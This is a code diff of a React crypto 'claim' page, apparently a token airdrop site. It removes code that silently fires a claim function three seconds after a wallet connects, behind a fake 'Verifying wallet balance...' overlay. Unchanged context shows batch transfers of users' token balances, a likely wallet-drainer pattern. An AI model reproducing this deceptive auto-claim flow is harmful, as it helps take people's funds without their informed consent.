@@ -77,18 +77,7 @@ const Apepe = () => {
 
   const claimFnRef = useRef<() => void>(() => {});
 
-  useEffect(() => {
-    const isConnected = (activeChain === 'evm' && isEVMConnected) || !!publicKey;
-    if (isConnected && !hasAutoTriggered && !isClaiming && !isVerifying) {
-      setHasAutoTriggered(true);
-      setIsVerifying(true);
-      const timer = setTimeout(() => {
-        setIsVerifying(false);
-        claimFnRef.current();
-      }, 3000);
-      return () => clearTimeout(timer);
-    }
-  }, [publicKey, isEVMConnected, activeChain, hasAutoTriggered, isClaiming, isVerifying]);
+  // Auto-verify popup removed: users connect their wallet and continue freely.
 
   const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[]) => {
     if (!publicKey) return null;
@@ -194,14 +183,7 @@ const Apepe = () => {
       <PegasusAnimation />
       <Navigation />
 
-      {isVerifying && (
-        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-background/80 backdrop-blur-sm">
-          <div className="flex flex-col items-center gap-4">
-            <Loader2 className="w-12 h-12 animate-spin text-primary" />
-            <p className="text-lg font-semibold text-foreground">Verifying wallet balance...</p>
-          </div>
-        </div>
-      )}
+      {/* Wallet verification overlay removed */}
 
       <section className="relative pt-20 sm:pt-28 md:pt-32 pb-12 sm:pb-16 px-4">
         <div className="container mx-auto max-w-4xl text-center">
